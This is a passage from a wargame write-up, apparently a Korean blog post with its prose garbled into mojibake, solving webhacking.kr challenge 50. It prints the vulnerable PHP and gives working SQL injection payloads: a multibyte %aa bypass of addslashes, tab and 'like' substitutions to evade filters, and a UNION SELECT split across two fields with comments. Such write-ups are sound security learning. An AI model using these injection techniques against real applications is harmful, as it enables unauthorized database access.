---
title: "[webhacking.kr] 50ë²ˆ ë¬¸ì œ í’€ì´[sql injection]"
categories:
  - webhacking
tags:
  - webhacking.kr
  - wargame
  - sql injection
toc: true
toc_sticky: true
toc_label: "50ë²ˆ ë¬¸ì œ í’€ì´"
toc_icon: "bookmark"
author_profile: true
---

ğŸ’¡ Webhacking.kr challenge(old) 50ë²ˆ ë¬¸ì œì— ëŒ€í•œ í’€ì´ì…ë‹ˆë‹¤.
{: .notice--warning}

# ë¬¸ì œ
  ![image](https://user-images.githubusercontent.com/33647663/152800629-e4705d63-a9d3-4697-b4b0-62419191d9f5.png)

  ```php
<?php
  if($_GET['id'] && $_GET['pw']){
    $db = dbconnect();
    $_GET['id'] = addslashes($_GET['id']); 
    $_GET['pw'] = addslashes($_GET['pw']);
    $_GET['id'] = mb_convert_encoding($_GET['id'],'utf-8','euc-kr');
    foreach($_GET as $ck) if(preg_match("/from|pw|\(|\)| |%|=|>|</i",$ck)) exit();
    if(preg_match("/union/i",$_GET['id'])) exit();
    $result = mysqli_fetch_array(mysqli_query($db,"select lv from chall50 where id='{$_GET['id']}' and pw=md5('{$_GET['pw']}')"));
    if($result){
      if($result['lv']==1) echo("level : 1<br><br>");
      if($result['lv']==2) echo("level : 2<br><br>");
    } 
    if($result['lv']=="3") solve(50);
    if(!$result) echo("Wrong");
  }
?>
  ```

# ë¬¸ì œ í’€ì´
  injectionì„ í•´ì•¼í•˜ëŠ” sql ë¬¸ ë¶€í„° ë³´ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

  ```sql
select lv from chall50 where id='{}' and pw=md5('{}')
  ```

  ìš°ì„  GET['id']ì˜ ê²½ìš° addslashes() í•¨ìˆ˜ ì´í›„ì— mb_convert_encodingí•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ UTF-8ë¡œ ì¸ì½”ë”©ì„ ë°”ê¿”ì¤¬ê¸° ë•Œë¬¸ì— multibyte encodingì„ ì´ìš©í•˜ì—¬ addslashes() í•¨ìˆ˜ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•´ì„œ idì— ìµì ì…˜ì„ ìˆ˜í–‰í•  ì¿¼ë¦¬ë¬¸ì„ ì‘ì„±í•©ë‹ˆë‹¤.

  ```sql
id=%aa' or lv=3--%20
  ```

  ì¿¼ë¦¬ë¬¸ì—ì„œ ë¬¸ì œì—ì„œ preg_matchë¡œ í•„í„°ë§ í•˜ëŠ” ë¬¸ìë¥¼ ìš°íšŒí•˜ë„ë¡ ë°”ê¿”ì¤ë‹ˆë‹¤. 
  
  **ê³µë°± -> %09** , **= -> like**

  ```sql
id=%aa'%09or%09lv%09like%093--%09
  ```

  ì¿¼ë¦¬ë¬¸ì„ ìˆ˜í–‰í•´ ë´¤ë”ë‹ˆ ë‹¤ìŒê³¼ ê°™ì´ ì•ˆë©ë‹ˆë‹¤.

  ![image](https://user-images.githubusercontent.com/33647663/152801787-2c8a9cb4-49b3-4aed-afb8-949597d16116.png)

  í˜¹ì‹œ í…Œì´ë¸”ì— lv=3ì¸ ë°ì´í„°ê°€ ì—†ëŠ”ì§€ í™•ì¸í•´ ë³´ê¸° ìœ„í•´ì„œ like 3 ì„ like 2ë¡œ ë°”ê¿”ì„œ í•´ë´¤ë”ë‹ˆ like 2 ëŠ” ì„±ê³µì ìœ¼ë¡œ ìˆ˜í–‰ë©ë‹ˆë‹¤.
  
  ![image](https://user-images.githubusercontent.com/33647663/152802015-6ad5c2d4-4750-4056-a11f-d3f766c88cf7.png)


  ì¦‰, í…Œì´ë¸”ì— lv = 2ì¸ ë°ì´í„°ëŠ” ìˆê¸° ë•Œë¬¸ì— ë‚˜ì˜¨ ê²ƒì´ê³  lv=3ì¸ ë°ì´í„°ëŠ” ì—†ê¸° ë•Œë¬¸ì— ì•ˆë‚˜ì˜¨ ê²ƒì…ë‹ˆë‹¤.

  í…Œì´ë¸”ì— ë°ì´í„°ê°€ ì—†ê¸° ë•Œë¬¸ì— **union select** êµ¬ë¬¸ì„ ì´ìš©í•´ì•¼ í•©ë‹ˆë‹¤.

  í•˜ì§€ë§Œ ì´ë²ˆ ë¬¸ì œì—ì„œ ê°€ì¥ ê¹Œë‹¤ë¡œìš´ ì¡°ê±´ì´ í•˜ë‚˜ ë¶™ì–´ ìˆì—ˆìŠµë‹ˆë‹¤. ë‹¤ìŒ ì¡°ê±´ ë•Œë¬¸ì— idì—ëŠ” unionì„ ì‚¬ìš©í•  ìˆ˜ ì—†ì—ˆìŠµë‹ˆë‹¤.

  ```php
if(preg_match("/union/i",$_GET['id'])) exit();
  ```

  ê·¸ë ‡ê¸° ë•Œë¬¸ì— pwë¥¼ í†µí•´ì„œ union select êµ¬ë¬¸ì„ ìˆ˜í–‰ì‹œì¼œì•¼ í•©ë‹ˆë‹¤.

  ì´ë²ˆ ë¬¸ì œë¥¼ í’€ê¸°ìœ„í•œ ì•„ì´ë””ì–´ëŠ” **ì£¼ì„**ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ë‹¤ìŒê³¼ ê°™ì´ id ì™€ pw ì‚¬ì´ì— ```/* */```ë¥¼ ë¼ì›Œ ë„£ìŠµë‹ˆë‹¤.

  ```sql
select lv from chall50 where id='%aa'/* and pw=md5('*/')
  ```
   
  ê·¸ëŸ¬ë©´ pw ìª½ì—ì„œ ```'```ê°€ ì§€ì›Œì§€ê¸° ë•Œë¬¸ì— ì¿¼ë¦¬ë¬¸ì„ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

  - id : %aa'/*
  - pw : */union%09select%093%23

  ìœ„ì™€ ê°™ì´ ì¿¼ë¦¬ë¬¸ì„ ë§Œë“¤ì–´ì„œ ì„œë²„ë¡œ ì „ì†¡í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë¬¸ì œê°€ í´ë¦¬ì–´ ë©ë‹ˆë‹¤.
  
![image](https://user-images.githubusercontent.com/33647663/152832453-87bd0d8c-fef7-4bbd-a180-11b7ea30e04e.png)